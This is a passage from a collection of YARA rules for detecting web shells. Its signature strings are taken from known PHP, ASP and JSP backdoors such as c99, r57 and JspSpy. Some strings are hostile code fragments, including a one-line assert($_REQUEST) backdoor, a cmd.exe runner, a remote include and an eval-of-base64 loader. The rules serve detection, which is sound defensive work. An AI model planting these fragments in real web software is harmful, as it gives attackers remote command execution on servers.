        fingerprint = "v1_sha256_bd485c825ae7ac11ff67d109d3c07fb405272a5919e00af39788d1a9c94e754d"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file 2.php"
        category = "INFO"
        hash = "267c37c3a285a84f541066fc5b3c1747"

    strings:
        $s0 = "<?php assert($_REQUEST[\"c\"]);?> " fullword
    condition:
        all of them
}
rule webshell_asp_cmdasp {
    meta:
        id = "6ElIY0cXtW5lqpLlSWWKci"
        fingerprint = "v1_sha256_4259419b4db8e6a83df6f7d258d41028f7f76b0fd2308eeadb4555066c5a2940"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file cmdasp.asp"
        category = "INFO"
        hash = "57b51418a799d2d016be546f399c2e9b"

    strings:
        $s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
        $s7 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
    condition:
        all of them
}
rule webshell_spjspshell {
    meta:
        id = "JEdK71hrtThMMOCXgUTvB"
        fingerprint = "v1_sha256_7926eadd3ffb21de73a63e7a28a525037bf88396ea369599b41ac8c0b0d112ad"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file spjspshell.jsp"
        category = "INFO"
        hash = "d39d51154aaad4ba89947c459a729971"

    strings:
        $s7 = "Unix:/bin/sh -c tar vxf xxx.tar Windows:c:\\winnt\\system32\\cmd.exe /c type c:"
    condition:
        all of them
}
rule webshell_jsp_action {
    meta:
        id = "1LkBLXaQJ99A9mmrTKGLD1"
        fingerprint = "v1_sha256_5ea7d074d0fe98cf2514a65231013a374532d6b3aa2487bcc34d4285f558752a"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file action.jsp"
        category = "INFO"
        hash = "5a7d931094f5570aaf5b7b3b06c3d8c0"

    strings:
        $s1 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";" fullword
        $s6 = "<%@ page contentType=\"text/html;charset=gb2312\"%>" fullword
    condition:
        all of them
}
rule webshell_Inderxer {
    meta:
        id = "1qpHS4KJcJ4yRqoEq8iKmE"
        fingerprint = "v1_sha256_915f2f38c1ca1321980ac66ebb95b0c46443e0ba64cc4b2014200db43439c85e"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file Inderxer.asp"
        category = "INFO"
        hash = "9ea82afb8c7070817d4cdf686abe0300"

    strings:
        $s4 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ"
    condition:
        all of them
}
rule webshell_asp_Rader {
    meta:
        id = "6slV7BcLIbxvu1eOBBvfl5"
        fingerprint = "v1_sha256_b578f3e844cbb361f455e55353fad2f0134ede7c3c468cebad9ae265e6e768b8"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file Rader.asp"
        category = "INFO"
        hash = "ad1a362e0a24c4475335e3e891a01731"

    strings:
        $s1 = "FONT-WEIGHT: bold; FONT-SIZE: 10px; BACKGROUND: none transparent scroll repeat 0"
        $s3 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 "
    condition:
        all of them
}
rule webshell_c99_madnet_smowu {
    meta:
        id = "1JsEMWU6UN60vDyOs2kQ06"
        fingerprint = "v1_sha256_5c4f76bdbe535a899e40c890eb1ea65e070c781fe5dd44cf13d4832cfd6d2e13"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file smowu.php"
        category = "INFO"
        hash = "3aaa8cad47055ba53190020311b0fb83"

    strings:
        $s0 = "//Authentication" fullword
        $s1 = "$login = \"" fullword
        $s2 = "eval(gzinflate(base64_decode('"
        $s4 = "//Pass"
        $s5 = "$md5_pass = \""
        $s6 = "//If no pass then hash"
    condition:
        all of them
}
rule webshell_php_moon {
    meta:
        id = "2rRybwNt2qjKbKvhhVetU3"
        fingerprint = "v1_sha256_4e26dbef647caee19a8707a067c228ba96bd986369e4c87c68964ae42c85b09a"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file moon.php"
        category = "INFO"
        hash = "2a2b1b783d3a2fa9a50b1496afa6e356"

    strings:
        $s2 = "echo '<option value=\"create function backshell returns string soname"
        $s3 = "echo      \"<input name='p' type='text' size='27' value='\".dirname(_FILE_).\""
        $s8 = "echo '<option value=\"select cmdshell(\\'net user "
    condition:
        2 of them
}
rule webshell_jsp_jdbc {
    meta:
        id = "2w8Jl1QSqGpdNFMJnSiFBi"
        fingerprint = "v1_sha256_462d97427793ef6e897b33f4fd02d452ad8cd11ddef21aa25d13efc981eb3afb"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file jdbc.jsp"
        category = "INFO"
        hash = "23b0e6f91a8f0d93b9c51a2a442119ce"

    strings:
        $s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
    condition:
        all of them
}
rule webshell_minupload {
    meta:
        id = "19RDvmcOqDkJXEGs9WKzf"
        fingerprint = "v1_sha256_53dea3ea0e2cf83907273fa7f64b21b40e9a5c8e4aa34e5d46d2762396fa89ce"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file minupload.jsp"
        category = "INFO"
        hash = "ec905a1395d176c27f388d202375bdf9"

    strings:
        $s0 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">   " fullword
        $s9 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859"
    condition:
        all of them
}
rule webshell_ELMALISEKER_Backd00r {
    meta:
        id = "41p2Y7c6z8ROTTici8ecou"
        fingerprint = "v1_sha256_c5eea930dc386c60e60f052c4945c8d6c0125d3500e60794e21d5ea04f226628"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file ELMALISEKER Backd00r.asp"
        category = "INFO"
        hash = "3aa403e0a42badb2c23d4a54ef43e2f4"

    strings:
        $s0 = "response.write(\"<tr><td bgcolor=#F8F8FF><input type=submit name=cmdtxtFileOptio"
        $s2 = "if FP = \"RefreshFolder\" or request.form(\"cmdOption\")=\"DeleteFolder\" or req"
    condition:
        all of them
}
rule webshell_PHP_bug_1_ {
    meta:
        id = "3ORRqS7HZbZOkv3fVkgCvw"
        fingerprint = "v1_sha256_12b957b7e0d0823721273ab71a19ee62d84a8dc5f584a46691f0e0aef996386e"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file bug (1).php"
        category = "INFO"
        hash = "91c5fae02ab16d51fc5af9354ac2f015"

    strings:
        $s0 = "@include($_GET['bug']);" fullword
    condition:
        all of them
}
rule webshell_caidao_shell_hkmjj {
    meta:
        id = "30ySZKuPyS6l0YrK7EVY3D"
        fingerprint = "v1_sha256_9a25df170ed165fe6528e6b9374ae572bcd26cd2e1f4014c7aa4953122671fac"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file hkmjj.asp"
        category = "INFO"
        hash = "e7b994fe9f878154ca18b7cde91ad2d0"

    strings:
        $s6 = "codeds=\"Li#uhtxhvw+%{{%,#@%{%#wkhq#hydo#uhtxhvw+%knpmm%,#hqg#li\"  " fullword
    condition:
        all of them
}
rule webshell_jsp_asd {
    meta:
        id = "2RFwr2IbuUVSS9sNszwOv9"
        fingerprint = "v1_sha256_6620b796b55a67010cd3edebc2ec84c2657717722129ea46288d262cfd1c7e1c"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file asd.jsp"
        category = "INFO"
        hash = "a042c2ca64176410236fcc97484ec599"

    strings:
        $s3 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%>" fullword
        $s6 = "<input size=\"100\" value=\"<%=application.getRealPath(\"/\") %>\" name=\"url"
    condition:
        all of them
}
rule webshell_jsp_inback3 {
    meta:
        id = "6KZ3nCmZsiHyWxpJ2KDkWo"
        fingerprint = "v1_sha256_8710d092b81c5de1e328ad6e57e5c4a25748cc92844198038c103dabc1e76e77"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file inback3.jsp"
        category = "INFO"
        hash = "ea5612492780a26b8aa7e5cedd9b8f4e"

    strings:
        $s0 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application"
    condition:
        all of them
}
rule webshell_metaslsoft {
    meta:
        id = "6ehDAfvGpAWwm8o3HHTTHr"
        fingerprint = "v1_sha256_20d938fbe21bcf04f09c6450a9acd5db556e9c9f83149d3cdd098be7a905d5ca"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file metaslsoft.php"
        category = "INFO"
        hash = "aa328ed1476f4a10c0bcc2dde4461789"

    strings:
        $s7 = "$buff .= \"<tr><td><a href=\\\"?d=\".$pwd.\"\\\">[ $folder ]</a></td><td>LINK</t"
    condition:
        all of them
}
rule webshell_asp_Ajan {
    meta:
        id = "6xvSAnZiHEd7rTcyu2Zhp2"
        fingerprint = "v1_sha256_1817786725de61150f1b3ff57597c780323a7f4df1c046cfd473e1918decd7d2"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file Ajan.asp"
        category = "INFO"
        hash = "b6f468252407efc2318639da22b08af0"

    strings:
        $s3 = "entrika.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreate"
    condition:
        all of them
}
rule webshell_config_myxx_zend {
    meta:
        id = "5e3P5Uvck0WcADnFpi8cJP"
        fingerprint = "v1_sha256_161dc712f279e73ea8cab4b0298cc2ca3799c6d9107050c4231a81021caed37f"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files config.jsp, myxx.jsp, zend.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "d44df8b1543b837e57cc8f25a0a68d92"
        hash1 = "e0354099bee243702eb11df8d0e046df"
        hash2 = "591ca89a25f06cf01e4345f98a22845c"

    strings:
        $s3 = ".println(\"<a href=\\\"javascript:alert('You Are In File Now ! Can Not Pack !');"
    condition:
        all of them
}
rule webshell_browser_201_3_ma_download {
    meta:
        id = "2Iv0OgqOakzTZ0oO6N6Y1z"
        fingerprint = "v1_sha256_3605e1304fb314c13d6c94d6ac9337731c6ee4fef679444d599cb3ae29023b56"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, download.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "37603e44ee6dc1c359feb68a0d566f76"
        hash1 = "a7e25b8ac605753ed0c438db93f6c498"
        hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
        hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
        hash4 = "fa87bbd7201021c1aefee6fcc5b8e25a"

    strings:
        $s2 = "<small>jsp File Browser version <%= VERSION_NR%> by <a"
        $s3 = "else if (fName.endsWith(\".mpg\") || fName.endsWith(\".mpeg\") || fName.endsWith"
    condition:
        all of them
}
rule webshell_itsec_itsecteam_shell_jHn {
    meta:
        id = "1Q0YiRghiZgtpRZVVlpivs"
        fingerprint = "v1_sha256_2775d7e47a26e06ea716bdca32a0f768eccf4d269caa3d107b4a78f8684ce741"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files itsec.php, itsecteam_shell.php, jHn.php"
        category = "INFO"
        super_rule = 1
        hash0 = "8ae9d2b50dc382f0571cd7492f079836"
        hash1 = "bd6d3b2763c705a01cc2b3f105a25fa4"
        hash2 = "40c6ecf77253e805ace85f119fe1cebb"

    strings:
        $s4 = "echo $head.\"<font face='Tahoma' size='2'>Operating System : \".php_uname().\"<b"
        $s5 = "echo \"<center><form name=client method='POST' action='$_SERVER[PHP_SELF]?do=db'"
    condition:
        all of them
}
rule webshell_ghost_source_icesword_silic {
    meta:
        id = "6IinsA6Tj1HhaJLSIqsRBI"
        fingerprint = "v1_sha256_22879d5279866e3c25a5b41a98b44595f191cfcac6489208b0bdb6b7ca7201e5"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files ghost_source.php, icesword.php, silic.php"
        category = "INFO"
        super_rule = 1
        hash0 = "cbf64a56306c1b5d98898468fc1fdbd8"
        hash1 = "6e20b41c040efb453d57780025a292ae"
        hash2 = "437d30c94f8eef92dc2f064de4998695"

    strings:
        $s3 = "if(eregi('WHERE|LIMIT',$_POST['nsql']) && eregi('SELECT|FROM',$_POST['nsql'])) $"
        $s6 = "if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST["
    condition:
        all of them
}
rule webshell_JspSpy_JspSpyJDK5_JspSpyJDK51_luci_jsp_spy2009_m_ma3_xxx {
    meta:
        id = "1aOTqeU82lRmDoHTX6RI43"
        fingerprint = "v1_sha256_6c61e5ccd4800f0cfd20532ab43f917f39a7367cc09cbe92e5320eb2c97fabf3"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files 000.jsp, 403.jsp, 807.jsp, a.jsp, c5.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, nogfw.jsp, ok.jsp, queryDong.jsp, spyjsp2010.jsp, style.jsp, t00ls.jsp, u.jsp, xia.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
        hash1 = "059058a27a7b0059e2c2f007ad4675ef"
        hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
        hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
        hash4 = "8b457934da3821ba58b06a113e0d53d9"
        hash5 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
        hash6 = "14e9688c86b454ed48171a9d4f48ace8"
        hash7 = "b330a6c2d49124ef0729539761d6ef0b"
        hash8 = "d71716df5042880ef84427acee8b121e"
        hash9 = "341298482cf90febebb8616426080d1d"
        hash10 = "29aebe333d6332f0ebc2258def94d57e"
        hash11 = "42654af68e5d4ea217e6ece5389eb302"
        hash12 = "88fc87e7c58249a398efd5ceae636073"
        hash13 = "4a812678308475c64132a9b56254edbc"
        hash14 = "9626eef1a8b9b8d773a3b2af09306a10"
        hash15 = "344f9073576a066142b2023629539ebd"
        hash16 = "32dea47d9c13f9000c4c807561341bee"
        hash17 = "90a5ba0c94199269ba33a58bc6a4ad99"
        hash18 = "655722eaa6c646437c8ae93daac46ae0"
        hash19 = "b9744f6876919c46a29ea05b1d95b1c3"
        hash20 = "9c94637f76e68487fa33f7b0030dd932"
        hash21 = "6acc82544be056580c3a1caaa4999956"
        hash22 = "6aa32a6392840e161a018f3907a86968"
        hash23 = "349ec229e3f8eda0f9eb918c74a8bf4c"
        hash24 = "3ea688e3439a1f56b16694667938316d"
        hash25 = "ab77e4d1006259d7cbc15884416ca88c"
        hash26 = "71097537a91fac6b01f46f66ee2d7749"
        hash27 = "2434a7a07cb47ce25b41d30bc291cacc"
        hash28 = "7a4b090619ecce6f7bd838fe5c58554b"

    strings:
        $s8 = "\"<form action=\\\"\"+SHELL_NAME+\"?o=upload\\\" method=\\\"POST\\\" enctype="
        $s9 = "<option value='reg query \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\T"
    condition:
        all of them
}
rule webshell_2_520_job_ma1_ma4_2 {
    meta:
        id = "1DMUQY5q3jwPgwdfOocYxC"
        fingerprint = "v1_sha256_db76ff42079b20d9e5c40661d7b30206e6bffc828f55daa4dc210662068f8e27"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files 2.jsp, 520.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "64a3bf9142b045b9062b204db39d4d57"
        hash1 = "9abd397c6498c41967b4dd327cf8b55a"
        hash2 = "56c005690da2558690c4aa305a31ad37"
        hash3 = "532b93e02cddfbb548ce5938fe2f5559"
        hash4 = "6e0fa491d620d4af4b67bae9162844ae"
        hash5 = "7eabe0f60975c0c73d625b7ddf7b9cbd"

    strings:
        $s4 = "_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" "
        $s9 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getR"
    condition:
        all of them
}
rule webshell_000_403_807_a_c5_config_css_dm_he1p_JspSpy_JspSpyJDK5_JspSpyJDK51_luci_jsp_xxx {
    meta:
        id = "3LS6ifrMuIUvxWJsZ2tkvW"
        fingerprint = "v1_sha256_cda47d7967b0f4b2a274ff2196d27d2e108b00917812093bbb3f033a8a1d1c3c"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files 000.jsp, 403.jsp, 807.jsp, a.jsp, c5.jsp, config.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, myxx.jsp, nogfw.jsp, ok.jsp, queryDong.jsp, spyjsp2010.jsp, style.jsp, t00ls.jsp, u.jsp, xia.jsp, zend.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
        hash1 = "059058a27a7b0059e2c2f007ad4675ef"
        hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
        hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
        hash4 = "8b457934da3821ba58b06a113e0d53d9"
        hash5 = "d44df8b1543b837e57cc8f25a0a68d92"
        hash6 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
        hash7 = "14e9688c86b454ed48171a9d4f48ace8"
        hash8 = "b330a6c2d49124ef0729539761d6ef0b"
        hash9 = "d71716df5042880ef84427acee8b121e"
        hash10 = "341298482cf90febebb8616426080d1d"
        hash11 = "29aebe333d6332f0ebc2258def94d57e"
        hash12 = "42654af68e5d4ea217e6ece5389eb302"
        hash13 = "88fc87e7c58249a398efd5ceae636073"
        hash14 = "4a812678308475c64132a9b56254edbc"
        hash15 = "9626eef1a8b9b8d773a3b2af09306a10"
        hash16 = "e0354099bee243702eb11df8d0e046df"
        hash17 = "344f9073576a066142b2023629539ebd"
        hash18 = "32dea47d9c13f9000c4c807561341bee"
        hash19 = "90a5ba0c94199269ba33a58bc6a4ad99"
        hash20 = "655722eaa6c646437c8ae93daac46ae0"
        hash21 = "b9744f6876919c46a29ea05b1d95b1c3"
        hash22 = "9c94637f76e68487fa33f7b0030dd932"
        hash23 = "6acc82544be056580c3a1caaa4999956"
        hash24 = "6aa32a6392840e161a018f3907a86968"
        hash25 = "591ca89a25f06cf01e4345f98a22845c"
        hash26 = "349ec229e3f8eda0f9eb918c74a8bf4c"
        hash27 = "3ea688e3439a1f56b16694667938316d"
        hash28 = "ab77e4d1006259d7cbc15884416ca88c"
        hash29 = "71097537a91fac6b01f46f66ee2d7749"
        hash30 = "2434a7a07cb47ce25b41d30bc291cacc"
        hash31 = "7a4b090619ecce6f7bd838fe5c58554b"

    strings:
        $s0 = "ports = \"21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500\";" fullword
        $s1 = "private static class VEditPropertyInvoker extends DefaultInvoker {" fullword
    condition:
        all of them
}
rule webshell_wso2_5_1_wso2_5_wso2 {
    meta:
        id = "5IvNvSa2spp3piE8m53WqS"
        fingerprint = "v1_sha256_f2dce52f1b8d2c33cd8478a468383a87f13712dc6e5c9050fea6ede4f0d24cc5"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files wso2.5.1.php, wso2.5.php, wso2.php"
        category = "INFO"
        super_rule = 1
        hash0 = "dbeecd555a2ef80615f0894027ad75dc"
        hash1 = "7c8e5d31aad28eb1f0a9a53145551e05"
        hash2 = "cbc44fb78220958f81b739b493024688"

    strings:
        $s7 = "$opt_charsets .= '<option value=\"'.$item.'\" '.($_POST['charset']==$item?'selec"
        $s8 = ".'</td><td><a href=\"#\" onclick=\"g(\\'FilesTools\\',null,\\''.urlencode($f['na"
    condition:
        all of them
}
rule webshell_000_403_c5_queryDong_spyjsp2010_t00ls {
    meta:
        id = "6RdP8DzZ09u4gCCT38N7MF"
        fingerprint = "v1_sha256_6f507499304a7cf4d14a134a4c0781fed9a94c40fe3257a4168bacdf3910ffec"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp, t00ls.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
        hash1 = "059058a27a7b0059e2c2f007ad4675ef"
        hash2 = "8b457934da3821ba58b06a113e0d53d9"
        hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
        hash4 = "655722eaa6c646437c8ae93daac46ae0"
        hash5 = "9c94637f76e68487fa33f7b0030dd932"

    strings:
        $s8 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')"
        $s9 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\""
    condition:
        all of them
}
rule webshell_404_data_suiyue {
    meta:
        id = "6LBg33aBcPFqqFsQTK1YTI"
        fingerprint = "v1_sha256_7f4ab5dbd2a72574c5d188e14ae98e599359b2d662266fc4c3a39d3d4405c208"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files 404.jsp, data.jsp, suiyue.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "7066f4469c3ec20f4890535b5f299122"
        hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
        hash2 = "c93d5bdf5cf62fe22e299d0f2b865ea7"

    strings:
        $s3 = " sbCopy.append(\"<input type=button name=goback value=' \"+strBack[languageNo]+"
    condition:
        all of them
}
rule webshell_r57shell_r57shell127_SnIpEr_SA_Shell_EgY_SpIdEr_ShElL_V2_r57_xxx {
    meta:
        id = "5WP48mi11iNrtWe5rYoGNC"
        fingerprint = "v1_sha256_04a58352202538d5446f1000c07341ea70434f00403f116233f335213687636e"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files r57shell.php, r57shell127.php, SnIpEr_SA Shell.php, EgY_SpIdEr ShElL V2.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57.php, r57.php, Backdoor.PHP.Agent.php"
        category = "INFO"
        super_rule = 1
        hash0 = "ef43fef943e9df90ddb6257950b3538f"
        hash1 = "ae025c886fbe7f9ed159f49593674832"
        hash2 = "911195a9b7c010f61b66439d9048f400"
        hash3 = "697dae78c040150daff7db751fc0c03c"
        hash4 = "513b7be8bd0595c377283a7c87b44b2e"
        hash5 = "1d912c55b96e2efe8ca873d6040e3b30"
        hash6 = "e5b2131dd1db0dbdb43b53c5ce99016a"
        hash7 = "4108f28a9792b50d95f95b9e5314fa1e"
        hash8 = "41af6fd253648885c7ad2ed524e0692d"
        hash9 = "6fcc283470465eed4870bcc3e2d7f14d"

    strings:
        $s2 = "echo sr(15,\"<b>\".$lang[$language.'_text58'].$arrow.\"</b>\",in('text','mk_name"
        $s3 = "echo sr(15,\"<b>\".$lang[$language.'_text21'].$arrow.\"</b>\",in('checkbox','nf1"
        $s9 = "echo sr(40,\"<b>\".$lang[$language.'_text26'].$arrow.\"</b>\",\"<select size="
    condition:
        all of them
}
rule webshell_807_a_css_dm_he1p_JspSpy_xxx {
    meta:
        id = "2QBjn4JZQQ3fXuxhnX3Bd0"
        fingerprint = "v1_sha256_eb045425a9f519dd7bf028a7795b16b89768682f5850b6a4d45f0991bfeb6431"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files 807.jsp, a.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, nogfw.jsp, ok.jsp, style.jsp, u.jsp, xia.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
        hash1 = "76037ebd781ad0eac363d56fc81f4b4f"
        hash2 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
        hash3 = "14e9688c86b454ed48171a9d4f48ace8"
        hash4 = "b330a6c2d49124ef0729539761d6ef0b"
        hash5 = "d71716df5042880ef84427acee8b121e"
        hash6 = "341298482cf90febebb8616426080d1d"
        hash7 = "29aebe333d6332f0ebc2258def94d57e"
        hash8 = "42654af68e5d4ea217e6ece5389eb302"
        hash9 = "88fc87e7c58249a398efd5ceae636073"
        hash10 = "4a812678308475c64132a9b56254edbc"
        hash11 = "9626eef1a8b9b8d773a3b2af09306a10"
        hash12 = "344f9073576a066142b2023629539ebd"
        hash13 = "32dea47d9c13f9000c4c807561341bee"
        hash14 = "b9744f6876919c46a29ea05b1d95b1c3"
        hash15 = "6acc82544be056580c3a1caaa4999956"
        hash16 = "6aa32a6392840e161a018f3907a86968"
        hash17 = "349ec229e3f8eda0f9eb918c74a8bf4c"
        hash18 = "3ea688e3439a1f56b16694667938316d"
        hash19 = "ab77e4d1006259d7cbc15884416ca88c"
        hash20 = "71097537a91fac6b01f46f66ee2d7749"
